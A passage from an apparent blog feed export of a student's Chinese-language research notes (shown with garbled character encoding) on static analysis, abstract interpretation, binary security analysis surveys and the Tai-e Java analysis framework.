<p>éš¾ä»¥ç½®ä¿¡ï¼Œâ€œåªæ˜¯â€ æŠŠè¿ç®—çš„æ“ä½œå’Œ APIs ä½œä¸ºä¸€ä¸ªå‘é‡è®¡ç®—ç›¸ä¼¼åº¦ï¼Œå°±èƒ½å‘ç°å¦‚æ­¤å¤šçš„æ¼æ´ï¼›å¦ä¸€æ–¹é¢åªæ˜¯è®¡ç®—è¿ç”¨äº†å¤šå°‘æ¬¡æŸç§è¿ç®—ï¼ˆåŸºæœ¬æ“ä½œç¬¦ä¸APIsï¼‰ä¸ºä»€ä¹ˆå·²ç»èƒ½å¤Ÿè¡¨ç¤ºè¿™ä¸€æ®µæ“ä½œäº†å‘¢ï¼Œè¿™ä¸åº”è¯¥æœ‰ä¸€ä¸ªæ—¶åºçš„å…³ç³»å˜›ï¼›ç°åœ¨å·²ç»è¿‡äº†ä¸€æ®µæ—¶é—´äº†ï¼ˆç›¸æ¯”äºé‚£æ¬¡ä¼šè®®ï¼Œæˆ–è€…è¯´è¿™ç¯‡è®ºæ–‡æ¥å—çš„æ—¶é—´ï¼‰ï¼Œä¸Šé¢çš„æ¼æ´ç¡®è®¤æ€ä¹ˆæ ·äº†è¿˜ä¸å¤ªæ¸…æ¥šï¼›å¦å¤–è¿™ç¯‡æ–‡ç« ä½¿ç”¨äº†éå¸¸å¤šå½¢å¼åŒ–æ–¹æ³•æ¥æè¿°æ±¡ç‚¹è¿½è¸ªç­‰æ“ä½œï¼Œçœ‹çš„å¤ªåƒåŠ›äº†ğŸ˜­æˆ‘å¤ªèœäº†ã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•£è¨˜</title>
    <url>/2023/10/14/%E6%95%A3%E8%A8%98-10-13-23/</url>
    <content><![CDATA[<blockquote>
<p> æ‰“ç®—æ—©ä¸Šå…ˆçœ‹ä¸€å€‹è¦–é »ï¼Œå…·é«”ç­è§£ä¸€ä¸‹æŠ½è±¡è§£é‡‹çš„ç›¸é—œæ¦‚å¿µï¼Œä¸‹åˆæŠŠ Tracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities çœ‹äº†</p>
</blockquote>
<p> SIG-ç¨‹åºåˆ†æ æŠ€æœ¯æ²™é¾™ æ•°å€¼ç¨‹åºåˆ†æâ€”é™ˆç«‹å‰ï¼ˆå›½é˜²ç§‘æŠ€å¤§å­¦ï¼‰</p>
<p>ä¸è®Šå¼ï¼ˆå€¼ï¼‰ç”Ÿæˆ</p>
<p>æŠ½è±¡è§£é‡‹ï¼šå°ç¨‹åºèªç¾©é€²è¡ŒæŠ½è±¡ï¼ˆè¿‘ä¼¼ï¼‰çš„é€šç”¨ç†è«–</p>
<p>Galois é€£æ¥</p>
<p>æŠ½è±¡åŸŸ</p>
<p><img src="https://i.imgs.ovh/2023/10/14/XyLPT.png" alt="image-20231014095701310"></p>
<p>æ•¸å€¼æŠ½è±¡åŸŸï¼Œåœ¨å…¶ä¸Šçš„æå–ï¼Œåˆå–</p>
<p><img src="https://i.imgs.ovh/2023/10/14/XyPip.png" alt="image-20231014095821500"></p>
<p>å¤šé¢èº°åŸŸï¼ˆç¶«æ€§ä¸ç­‰å¼åŸŸï¼‰ï¼Œå…«é‚Šå½¢åŸŸï¼ˆåˆ»ç•«+1,-1,0ï¼Œå…©å€‹è®Šé‡ä¹‹é–“çš„é—œä¿‚ï¼‰</p>
<p>ä¸Šè¿‘ä¼¼ï¼šç„¡æ¼å ±ä½†æ˜¯å¯èƒ½å­˜åœ¨èª¤å ±</p>
<p>å‡¸æŠ½è±¡åŸŸï¼ˆç¶«æ€§æŠ½è±¡åŸŸï¼‰ï¼Œå‡¸æŠ½è±¡åŸŸï¼ˆå€é–“ç¶«æ€§æŠ½è±¡åŸŸï¼Œçµ•å°å€¼ç¶«æ€§æŠ½è±¡åŸŸï¼‰</p>
<p>æ•¸å€¼ç¨‹å¼åˆ†æ</p>
<ul>
<li>çµåˆæŠ½è±¡åŸŸèˆ‡SMTçš„ç¨‹å¼åˆ†æ</li>
<li>è»Ÿä»¶ä¸­è³‡æºä½¿ç”¨é‡ä¸Šç•Œåˆ†æ</li>
<li>ç¥ç¶“ç¶²çµ¡æ¶æ§‹ä¸­çš„æ•¸å€¼ç¼ºé™·æª¢æ¸¬</li>
</ul>
<p>ä»–äººæå•:</p>
<ul>
<li>æ‡‰è©²é¸æ“‡ä»€éº½æ¨£çš„æŠ½è±¡åŸŸ</li>
<li>æ€éº½å»è‡ªå‹•åŒ–åœ°æª¢æ¸¬æŠ½è±¡åŸŸçš„ç²¾åº¦</li>
<li>â€¦</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>æŠ½è±¡è§£é‡Š</tag>
        <tag>æ•°å€¼ç¨‹åºåˆ†æ</tag>
        <tag>æŠ½è±¡åŸŸ</tag>
      </tags>
  </entry>
  <entry>
    <title>é™æ€åˆ†æç›¸å…³ç»¼è¿°ç¬”è®°</title>
    <url>/2023/10/12/%E6%95%A3%E8%A8%98-10-12-23/</url>
    <content><![CDATA[<p>ç£•ç£•ç»Šç»Šçš„è¯»äº†ä¸€ç¯‡è®²é™æ€åˆ†ææ¡†æ¶çš„è®ºæ–‡ï¼Œå‘ç°è‡ªå·±æ²¡æœ‰æç‚¼è‡ªå·±çš„çŸ¥è¯†ï¼Œæœ‰ä¸€ç§ â€œå“¦,åŸæ¥æ˜¯è¿™æ ·â€ çš„ä¼¼æ‡‚éæ‡‚çš„å‚²æ…¢ã€‚</p>
<p>è¯»äº†ä¸€äº›ç»¼è¿°ï¼Œæ‰“ç®—æŠŠè¿™äº›ä¸œè¥¿å†æ¢³ç†ä¸€éã€‚</p>
<p>ä»¥ä¸‹çš„å†…å®¹éå¸¸æ•£ï¼Œå¦‚æœå¯¹æ–‡ç« æ„Ÿå…´è¶£åˆä¸æƒ³çœ‹æ–‡å­—ï¼Œçœ‹å›¾ç‰‡éƒ¨åˆ†å°±å¤Ÿäº†ã€‚</p>
<h1 id="äºŒè¿›åˆ¶ä»£ç å®‰å…¨åˆ†æç»¼è¿°ï¼ˆéƒ¨åˆ†ï¼‰"><a href="#äºŒè¿›åˆ¶ä»£ç å®‰å…¨åˆ†æç»¼è¿°ï¼ˆéƒ¨åˆ†ï¼‰" class="headerlink" title="äºŒè¿›åˆ¶ä»£ç å®‰å…¨åˆ†æç»¼è¿°ï¼ˆéƒ¨åˆ†ï¼‰"></a>äºŒè¿›åˆ¶ä»£ç å®‰å…¨åˆ†æç»¼è¿°ï¼ˆéƒ¨åˆ†ï¼‰</h1><p>ä½œè€…ä¸»è¦æ¥è‡ªå¤æ—¦å¤§å­¦çš„è½¯ä»¶å­¦é™¢ä¸ä¸Šæµ·å¸‚æ•°æ®ç§‘å­¦é‡ç‚¹å®éªŒå®¤</p>
<h2 id="å¼•è¨€-æ‘˜"><a href="#å¼•è¨€-æ‘˜" class="headerlink" title="å¼•è¨€-æ‘˜"></a>å¼•è¨€-æ‘˜</h2><p>è½¯ä»¶å®‰å…¨åˆ†æç¬¼ç»Ÿçš„è¯´å¯å½’ç±»ä¸¤ç§</p>
<ul>
<li>æºä»£ç çº§åˆ«</li>
<li>äºŒè¿›åˆ¶çº§åˆ«</li>
</ul>
<p>ä½œè€…è®²äº†äºŒè€…çš„åŒºåˆ«ï¼Œ</p>
<blockquote>
<p>äºŒè¿›åˆ¶çº§åˆ«çš„ä»£ç åˆ†æä¸Šå­˜åœ¨ç€ä¸€å®šçš„æŒ‘æˆ˜ï¼Œé¦– å…ˆè½¯ä»¶ç¨‹åºéœ€è¦ä»æºä»£ç ç»è¿‡ç¼–è¯‘ã€ä¼˜åŒ–ä¹‹åç”ŸæˆäºŒ è¿›åˆ¶å¯æ‰§è¡Œç¨‹åºï¼ŒäºŒè¿›åˆ¶ä»£ç å¯è¯»æ€§é™ä½ï¼Œä¸”åœ¨ç¨‹åºçš„</p>
<p>ç¼–è¯‘è¿‡ç¨‹ä¸­å¾€å¾€ä¼šä¸¢å¤±æ‰ä¸Šå±‚çš„ç»“æ„å’Œç±»å‹ç­‰ä¿¡æ¯ (ä¾‹å¦‚å°†å˜é‡å’Œæ•°æ®ç»“æ„å­˜åˆ°é€šç”¨å¯„å­˜å™¨æˆ–è€…å†…å­˜ä¸­1ï¼Œ ä»è€Œå¯¼è‡´åˆ†æä»»åŠ¡æ›´ä¸¥å³»ï¼Œéš¾åº¦æ›´å¤§;</p>
</blockquote>
<p>æœ‰ä¸€ç‚¹ç‚¹ç–‘é—®ğŸ¤”ã€‚å…³äºä¼˜åŒ–åå¤±æ‰ä¸Šå±‚çš„ç»“æ„å’Œç±»å‹ç­‰ä¿¡æ¯ã€‚è™½ç„¶å¯èƒ½å¤±æ‰äº†æºç çº§åˆ«çš„ç¬¦å·ï¼Œä½†æ˜¯å¦‚æœèƒ½å¤Ÿè¿˜åŸå‡ºéƒ¨åˆ†ç¬¦å·ï¼Œè¿™ä¸ªç¬¦å·æ˜¯æœ€è´´è¿‘å®é™…è¿è¡Œçš„ï¼Œè€Œä¸”ä¿¡æ¯é‡ä¹Ÿæ˜¯éå¸¸å¤§çš„ï¼Œæ¯”å¦‚ç¼–è¯‘æœŸçš„åå°„åœ¨äºŒè¿›åˆ¶çœ¼å‰å°±æ˜¯éå¸¸ç›´ç™½çš„å­˜åœ¨ã€‚å†å¦ä¸€ä¸ªç»¼è¿°ä¸­äº†è§£åˆ°æœ‰ä¸€ç¯‡è¯´å¯ä»¥è¿½è¸ªå˜é‡çš„ä½¿ç”¨è‡ªåŠ¨çš„è¿˜åŸå‡ºç»“æ„ä½“ï¼Œå¯èƒ½è¿™ä¸€ç¯‡ä¸å¤Ÿè¯¦ç»†ã€‚</p>
<p><strong>äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŒ‰ç…§æ˜¯å¦è¦è¿è¡Œå¯ä»¥åˆ†ä¸º</strong></p>
<ul>
<li>é™æ€åˆ†æ</li>
<li>åŠ¨æ€åˆ†æ</li>
<li>é™æ€æ··åˆçš„åˆ†ææŠ€æœ¯</li>
</ul>
<p>é™æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŠ€æœ¯</p>
<p>é™æ€åˆ†æäºŒè¿›åˆ¶å®‰å…¨æŠ€æœ¯å¯ä»¥å½’çº³</p>
<ul>
<li>æ‰¾å·²çŸ¥çš„æ¼æ´â€“ä»£ç ç›¸ä¼¼æ€§åˆ†æï¼ˆPewnyç­‰äºº2015æ£€æµ‹ä»£ç ç›¸ä¼¼æ€§è·¨æŒ‡ä»¤é›†æ¶æ„ï¼ŒFengç­‰äºº2014äºŒè¿›åˆ¶ä»£ç è¯­æ„ç›¸ä¼¼æ€§æ£€æµ‹ï¼ŒXuç­‰äºº2020ï¼ŒJangç­‰äºº2021çš„ï¼‰</li>
<li>æ‰¾æœªçŸ¥çš„æ¼æ´â€“æ•°æ®æµåˆ†æï¼Œç¬¦å·éªŒè¯ç­‰æ–¹æ³•</li>
</ul>
<p>å€¼å¾—ä¸€æï¼Œä½¿ç”¨ç¥ç»ç½‘ç»œç®—æ³•ç²¾ç¡®æŸ¥æ‰¾äºŒè¿›åˆ¶ä»£ç çš„å®‰å…¨æ¼æ´æ–¹æ³•ä¹Ÿå¼€å§‹ä½¿ç”¨ã€‚</p>
<p><strong>å‘ç°é«˜ä»·å€¼æ¼æ´ï¼ˆå°šæœªè¢«å‘ç°çš„æ¼æ´ï¼‰</strong></p>
<ul>
<li><strong>IntScope</strong>ç”¨<strong>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯</strong>å¯¹ç¨‹åºä¸­çš„æ•°æ®æµè¿›è¡Œåˆ†æ</li>
<li><strong>PiOs</strong> å¯¹iosç³»ç»Ÿçš„æ‰‹æœºè½¯ä»¶è¿›è¡Œæ¼æ´æ£€æµ‹ï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶æ„å»º**æ§åˆ¶æµå›¾(CFG)**ï¼Œæ ‡è®°ä»£ç ä¸­çš„æ•æ„Ÿæ•°æ®ä»¥åŠå¯ä»¥æ³„éœ²æ•°æ®çš„ä»£ç æ®µã€‚</li>
<li><strong>FirmaliceH</strong> ä½¿ç”¨<strong>ç¬¦å·éªŒè¯</strong>çš„æ–¹æ³•ï¼Œé€šè¿‡å¯¹å›ºä»¶è½¯ä»¶ä¸­å¯èƒ½çš„ç”³è¯· æƒé™çš„æ•æ„Ÿæ§åˆ¶æµè¿›è¡Œåˆ†æï¼Œå¾—å‡ºèƒ½å¤Ÿåˆ°è¾¾è·å¾—é«˜çº§æƒé™æˆ–è€…ç»•è¿‡æƒé™çš„æ§åˆ¶æµè·¯å¾„</li>
<li>é™¤äº†å¯¹ç”¨æˆ·ç¨‹åºä»¥åŠåµŒå…¥å¼ç¨‹åºçš„ æ¼æ´æ£€æµ‹å¤–ï¼Œæ—¥å¸¸ä½¿ç”¨çš„Linuxæ“ä½œç³»ç»Ÿã€Windows æ“ä½œç³»ç»Ÿä»¥åŠApple kemelä¹Ÿå­˜åœ¨ç€ä¸€å®šçš„æ¼æ´ï¼Œ<strong>DRCHCEKER</strong>ã€<strong>digtoolH</strong>ä»¥åŠ<strong>iDEA</strong>åˆ†åˆ«ä½¿ç”¨<strong>ä¸€äº›é™æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææ–¹æ³•çš„ç»„åˆ</strong>å®Œæˆäº†å¯¹ä¸Šè¿°æ“ä½œç³» ç»Ÿçš„æ¼æ´æ£€æµ‹ï¼Œä¸»è¦æ˜¯é’ˆå¯¹æƒé™æ³„éœ²ã€ä¿¡æ¯æ³„éœ²ç­‰ æ¼æ´.</li>
</ul>
<p>æ–°åŠ¿åŠ› â€ç¥ç»ç½‘ç»œã€æœºå™¨å­¦ä¹ ç®—æ³•â€œ â€“<strong>VESTING</strong>ï¼ˆæ ¸å¿ƒæ€æƒ³ï¼šä»£ç ç›¸ä¼¼æ€§ï¼‰ã€‚<strong>Ouyang</strong> ä½¿ç”¨ <strong>NLP</strong> ä¸­çš„æ·±åº¦å­¦ä¹ ç¥ç»ç½‘ç»œæ¥è¿›è¡Œæ¼æ´æ£€æµ‹ï¼Œå…¶æ ¸å¿ƒæ˜¯ä»£ç ç›¸ä¼¼æ€§åˆ†æï¼ˆ<strong>Word2Vecï¼ŒLSTM</strong>ï¼‰ã€‚</p>
<h2 id="åŠ¨æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŠ€æœ¯"><a href="#åŠ¨æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŠ€æœ¯" class="headerlink" title="åŠ¨æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŠ€æœ¯"></a>åŠ¨æ€äºŒè¿›åˆ¶å®‰å…¨åˆ†ææŠ€æœ¯</h2><p>åŸå› ï¼šé™æ€åˆ†ææ— æ³•è·å¾—åŠ¨æ€ä¿¡æ¯ï¼Œåˆ†æç²’åº¦çš„çš„ç³»ç»Ÿçº§åˆ«è¡Œä¸ºï¼ˆç³»ç»Ÿå¼‚å¸¸å¤„ç†ï¼Ÿè¿™é‡Œæœ‰ä¸€ç‚¹æ¨¡ç³Šï¼‰ï¼Œå¯¼è‡´é™æ€åˆ†æçµæ´»æ€§å’Œç²¾åº¦å·®ã€‚</p>
<p>åŠ¨æ€äºŒè¿›åˆ¶å®‰å…¨ç»å¸¸ä½¿ç”¨æ’æ¡©æŠ€æœ¯ï¼Œç»å…¸çš„å·¥å…·æœ‰ PINï¼Œ<strong>DynamoRIO</strong>ï¼Œ<strong>Valgrind</strong>ï¼Œ<strong>DynInst</strong> å’Œ <strong>Libdetox</strong>ã€‚</p>
<p>ç³»ç»Ÿçº§åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©å·¥å…·ï¼Œæœ€å¸¸è§åŸºäº<strong>QEMU</strong>ï¼Œå·¥å…·æœ‰<strong>QTrace</strong>ï¼Œ<strong>Panda</strong>ï¼Œ<strong>PEMU</strong>ã€‚</p>
<p>åŠ¨æ€æ±¡ç‚¹è¿½è¸ªï¼Œ<strong>Dytan</strong>ï¼Œ<strong>Minemu</strong>ï¼ˆx86 basedï¼‰ï¼Œ<strong>TaintDroid</strong>ï¼ˆfor Androidï¼‰ã€‚</p>
<p>æ¶æ„è½¯ä»¶æ£€æµ‹ï¼Œ<strong>X-Force</strong>ï¼ˆåŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©ï¼Œæ— å´©æºƒæ¨¡å‹ï¼‰ã€‚Bernadi ç­‰äººæå‡ºåŸºäºè¿‡ç¨‹æŒ–æ˜çš„æ¶æ„è½¯ä»¶æ£€æµ‹æ–¹æ³•ï¼Œç³»ç»Ÿè°ƒç”¨åºåˆ—ä½œä¸ºæŒ‡çº¹ï¼Œè®­ç»ƒåˆ†ç±»å™¨è¿›è¡Œåˆ†ç±»ã€‚Arora ç­‰äººæå‡ºç½‘ç»œæµé‡ç‰¹å¾+è§„åˆ™åˆ†ç±»å™¨ã€‚</p>
<p><strong>LOOP</strong> æ£€æµ‹&#x2F;åˆ†æ<strong>ä¸é€æ˜è°“è¯</strong>ï¼ˆè¿è¡Œæ—¶ä¸å¯çŸ¥ï¼‰</p>
<p>æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è®²<strong>ä¸é€æ˜è°“è¯</strong>çš„ä¾‹å­ï¼š</p>
<p><img src="https://i.imgs.ovh/2023/10/12/XtSe3.md.png"></p>
<p><strong>K-Hunt</strong> æ£€æµ‹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¸å®‰å…¨å¯†é’¥ã€‚åŸç†æœ‰ç‚¹ç±»ä¼¼æ±¡ç‚¹è¿½è¸ªã€‚</p>
<p><strong>QVMIIï¼ŒQelt</strong> ç³»ç»Ÿçº§åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©å·¥å…·ã€‚</p>
<p>åŠ¨é™æ··åˆæ–¹æ³•ä¸å±•å¼€äº†ï¼Œä»¥ä¸‹æ˜¯ä¸Šé¢å·¥å…·çš„è¯„ä»·ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/12/Xtu99.png" alt="image-20231011133802185"></p>
<p>ä½œè€…è®¤ä¸ºæœªæ¥æœ‰ä»¥ä¸‹æŒ‘æˆ˜</p>
<ul>
<li>ç²¾åº¦ï¼Œæ•ˆç‡ï¼Œä»£ç è¦†ç›–ç‡çš„çŸ›ç›¾</li>
<li>æ™ºèƒ½åŒ–</li>
<li>ç±»å‹æ¢å¤</li>
<li>å†…æ ¸ä»£ç å®‰å…¨åˆ†æ</li>
</ul>
<p>ä¾‹å­æ¯”è¾ƒç»å…¸<del>ï¼ˆè€</del>ï¼Œæœ€åå…³äºæœªæ¥çš„æŒ‘æˆ˜ï¼Œæ„Ÿè§‰è§’åº¦æœ‰ä¸€ç‚¹å°‘ã€‚</p>
<h1 id="ç¨‹åºåˆ†æç ”ç©¶è¿›å±•ï¼ˆç»¼è¿°ï¼‰"><a href="#ç¨‹åºåˆ†æç ”ç©¶è¿›å±•ï¼ˆç»¼è¿°ï¼‰" class="headerlink" title="ç¨‹åºåˆ†æç ”ç©¶è¿›å±•ï¼ˆç»¼è¿°ï¼‰"></a>ç¨‹åºåˆ†æç ”ç©¶è¿›å±•ï¼ˆç»¼è¿°ï¼‰</h1><p>æ¥è‡ªè½¯ä»¶å­¦æŠ¥çš„ä¸€ç¯‡æ¯”è¾ƒä¸é”™çš„ç»¼è¿°</p>
<p>è®²è§£äº†ç¨‹åºåˆ†æçš„å‡ ç§æŠ€æœ¯</p>
<ul>
<li>æŠ½è±¡è§£é‡Š</li>
</ul>
<p>æŠ½è±¡è§£é‡Šä¸­æŠ½è±¡åŸŸçš„æ¦‚å¿µç›®å‰å®åœ¨éš¾ä»¥ç†è§£ï¼Œæ‰¾åˆ°çŸ¥ä¹çš„æ¯”è¾ƒå¥½çš„æ–‡ç«  <a href="https://zhuanlan.zhihu.com/p/602442089">https://zhuanlan.zhihu.com/p/602442089</a></p>
<ul>
<li>æ•°æ®æµåˆ†æ</li>
<li>åŸºäºæ‘˜è¦çš„è¿‡ç¨‹é—´åˆ†æ</li>
<li>ç¬¦å·æ‰§è¡Œ</li>
<li>åŠ¨æ€åˆ†æ</li>
<li>åŸºäºæœºå™¨å­¦çš„ç¨‹åºåˆ†æ</li>
</ul>
<p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™äº›æ¦‚å¿µå¹¶ä¸æ˜¯ç‹¬ç«‹çš„ã€‚</p>
<p>é¢å‘ç‰¹å®šè½¯ä»¶çš„ç¨‹åºåˆ†ææŠ€æœ¯</p>
<ul>
<li>ç§»åŠ¨åº”ç”¨è½¯ä»¶</li>
<li>å¹¶å‘è½¯ä»¶</li>
<li>åˆ†å¸ƒå¼ç³»ç»Ÿ</li>
<li>äºŒè¿›åˆ¶ä»£ç ï¼ˆä¸Šä¸€ç¯‡ç»¼è¿°è¯¦ç»†æè¿°çš„ï¼‰</li>
</ul>
<p>å±•æœ›</p>
<ul>
<li>é¢å‘æ™ºèƒ½åˆçº¦çš„ç¨‹åºåˆ†æ</li>
<li>é¢å‘æœºå™¨å­¦ä¹ çš„ç¨‹åºåˆ†æ</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>è®ºæ–‡é˜…è¯»ç¬”è®°</title>
    <url>/2023/10/08/%E6%95%A3%E8%A8%98-10-8-23/</url>
    <content><![CDATA[<p>ä»Šå¤©åˆ†äº«ä¸€æ¥è‡ª ISSTA 2023 çš„é™æ€åˆ†ææ–‡ç« ã€‚Tai-e: A Developer-Friendly Static Analysis Framework for Java by Harnessing the Good Designs of Classics</p>
<blockquote>
<p>Tian Tan and Yue Li. 2023. Tai-e: A Developer-Friendly Static Analysis Framework for Java by Harnessing the Good Designs of Classics. In Proceedings of the 32nd ACM SIGSOFT International Symposium on Software Testing and Analysis (ISSTA 2023). Association for Computing Machinery, New York, NY, USA, 1093â€“1105. <a href="https://doi.org/10.1145/3597926.3598120">https://doi.org/10.1145/3597926.3598120</a></p>
</blockquote>
<p>bç«™ä¸Šæœ‰ä¸€ä¸ªé™æ€åˆ†æè¯¾ç¨‹ï¼Œä½œè€…åŸºäº tai-e è®¾è®¡äº†ä¸€ä¸ªå­¦ä¹ æ€§è´¨çš„é™æ€åˆ†æå·¥å…·ï¼Œä¹Ÿæ˜¯éå¸¸çš„æœ‰è¶£ã€‚</p>
<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>æ¯”èµ·é™æ€åˆ†ææœ¬èº«çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯¹é™æ€åˆ†æçš„æ¡†æ¶è¿˜çŸ¥ä¹‹ç”šå°‘ã€‚</p>
<p>ä½œè€…æ¯”è¾ƒäº†è®¸å¤šç»å…¸çš„ Java çš„é™æ€åˆ†ææ¡†æ¶æ¯”å¦‚ **Sootï¼ŒWalaï¼ŒDoopï¼ŒSpotBugs **ï¼Œä»ä¸­é€‰æ‹©æ¯”è¾ƒå¥½çš„æ¡†æ¶ï¼Œå¦‚æœä»»ä½•ä¸€ä¸ªéƒ½ä¸å¤Ÿå¥½ï¼Œä»–ä»¬ä¼šå°½å¯èƒ½åœ°æå‡ºä¸€ç§æ›´å¥½çš„è®¾è®¡ã€‚</p>
<p><strong>è¿™æ˜¯ç¬¬ä¸€ç¯‡ç³»ç»Ÿæ€§çš„å…³äº Java é™æ€åˆ†ææ¡†æ¶çš„è®¾è®¡ä¸å®ç°çš„æ¢ç´¢ã€‚</strong></p>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>é™æ€åˆ†æåœ¨éå¸¸å¤šçš„é¢†åŸŸåšå‡ºè´¡çŒ®ï¼Œæ¯”å¦‚æ£€æµ‹è½¯ä»¶ç¼ºé™·ï¼Œå®‰å…¨åˆ†æï¼Œä»£ç ä¼˜åŒ–ï¼Œç¨‹åºç†è§£ï¼Œå®ƒè¿˜å¯¹ç ”ç©¶å·¥ä½œå’Œä¸šç•Œçš„äº§å“æœ‰ä¸€å®šçš„å¸®åŠ©ã€‚</p>
<p>ç„¶è€Œï¼Œå°½ç®¡é™æ€åˆ†æå–å¾—äº†å¦‚æ­¤å·¨å¤§çš„æˆå°±ï¼Œåœ¨è¿‡å»çš„å‡ åå¹´é‡Œå‡ºç°äº†è®¸å¤šæœ‰åçš„æ¡†æ¶ï¼Œè¿™äº›æ¡†æ¶å´å¯¹äºæƒ³ä½¿ç”¨è¿™äº› analysis çš„å¼€å‘è€…å¹¶ä¸æ˜“äºå­¦ä¹ ã€‚æ¢è¨€ä¹‹ï¼Œä¸ºäº†æ„å»ºä¸€ä¸ª developer friendly é™æ€åˆ†ææ¡†æ¶ï¼Œè¿™ä¹Ÿæ˜¯éå¸¸å›°éš¾çš„ï¼Œå¾€å¾€æ˜¯å¯¹ä¸åŒç›®æ ‡æ¯”å¦‚æ•ˆç‡ï¼Œç®€æ˜“åº¦ï¼Œå¯ç”¨æ€§çš„ä¸€ä¸ªæƒè¡¡ã€‚</p>
<p>äººä»¬å¯¹äºä»£ç çš„æ¡†æ¶æœ¬èº«å´çŸ¥ä¹‹ç”šå°‘ï¼Œæ­£å¦‚ Soot ä½œè€…æ‰€è¨€ï¼š</p>
<blockquote>
<p>â€œWe have noticed that it is difficult to publish framework papersâ€¦ We encourage conferences to accept more framework papers.â€</p>
</blockquote>
<p>åœ¨è¿™æ–¹é¢ï¼Œä½œè€…è¿ˆå‡ºäº†ä¸€æ­¥ï¼Œè®¨è®ºäº†ä¸€äº›é™æ€åˆ†æå…³é”®ç»„ä»¶çš„ä¸€äº›è®¾è®¡æƒè¡¡ã€‚</p>
<ul>
<li><strong>ç¨‹åºæŠ½è±¡ï¼ˆProgram Abstractionï¼‰</strong>ï¼šéœ€è¦æä¾›ç¨‹åºæŠ½è±¡æ¨¡å‹ï¼ŒåŒ…æ‹¬ IRï¼Œç±»ç»§æ‰¿ç­‰ï¼Œä¸ºäº†è¡¨ç¤ºæ‰€æœ‰ç¨‹åºçš„è¦ç´ ï¼ˆé™æ€åˆ†ææ‰€éœ€çš„è¦ç´ ï¼‰</li>
<li><strong>åŸºç¡€åˆ†æï¼ˆFundamental Analysesï¼‰</strong>ï¼šä¸ºäº†è®©ç¨‹åºæä¾›æ¯”è¾ƒ friendly çš„åˆ†ææ¡†æ¶æ¯”å¦‚æ§åˆ¶æµå’Œ call graph çš„ graph-based ç®—æ³•å’Œè¾“å…¥ç¨‹åºçš„å†…å­˜æŠ½è±¡ä¿¡æ¯æ¯”å¦‚ points-to&#x2F;alias relations</li>
<li><strong>æ–°çš„åˆ†æå¼€å‘ï¼ˆNew Analysis Developmentï¼‰</strong>ï¼šä¸ºå¼€å‘è€…ç•™çš„æ¥å£ï¼Œä¾¿äºå®ç°å…¥å®‰å…¨åˆ†æï¼Œå¼‚å¸¸åˆ†æï¼Œåå°„åˆ†æç­‰</li>
<li><strong>å¯¹å¤šç§åˆ†æçš„ç®¡ç†ï¼ˆMultiple Analyses Managementï¼‰</strong>ï¼šå®ƒåº”è¯¥æä¾›ä¸€ç§æ ‡å‡†çš„æ–¹æ³•å»ç®¡ç†å¤šç§çš„ analysesï¼Œæ¯”å¦‚å½“ä»–ä»¬ï¼ˆanalysesï¼‰è¦ä¸€èµ·å·¥ä½œçš„æ—¶å€™åº”è¯¥æ€ä¹ˆåä½œ</li>
</ul>
<p>è€ƒè™‘äº†è¿™äº›ï¼Œè¯ç”Ÿäº† Tai-e è¿™ä¸ªé™æ€åˆ†ææ¡†æ¶ã€‚ ä¸»è¦æœ‰ä¸€ä¸‹çš„è´¡çŒ®</p>
<p><strong>1.</strong> è®¨è®ºäº†ç»å…¸çš„é™æ€åˆ†ææ¡†æ¶ï¼Œè®¨è®ºäº†å…¶åˆç†æ€§ï¼Œä¸ºæ„å»ºä¸€ä¸ªæ›´å¥½çš„é™æ€åˆ†ææ¡†æ¶æä¾›äº†ä¸€äº›æœ‰ç”¨çš„ææ–™å’Œè§‚ç‚¹</p>
<p><strong>2.</strong> Tai-e å¼€å‘å‹å¥½å‹é™æ€åˆ†ææ¡†æ¶ã€‚éµå¾ª HGDC åŸåˆ™ã€‚å‡ºäº†æ¥è‡ª HGDC çš„åˆ›æ–°å¤–ï¼ŒTai-e è¿˜æœ‰ä¸€äº›å…·ä½“çš„åˆ›æ–°è®¾è®¡ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>ä½¿ç”¨å‹å¥½å‹ IRï¼Œæ¯”èµ· Soot å’Œ Wala æ›´åŠ çš„ç®€æ´ï¼Œæ›´æ˜“äºç†è§£</li>
<li>é«˜æ•ˆçš„æŒ‡é’ˆåˆ†æï¼Œé«˜æ‹“å±•æ€§</li>
<li>åˆ›æ–°å‹çš„ analysis æ’ä»¶ï¼Œæ˜“äºå¼€å‘ä¸æ•´åˆæ–°çš„ analysis æ¯”å¦‚æ±¡ç‚¹è¿½è¸ªå¼‚å¸¸åˆ†æç­‰</li>
</ul>
<p>Tai-e æœ€åˆçš„ç›®çš„æ˜¯æœ‰ä¸ªæ›´ friendly é™æ€åˆ†ææ¡†æ¶ï¼Œä½¿ç”¨è€…çš„åé¦ˆï¼š</p>
<blockquote>
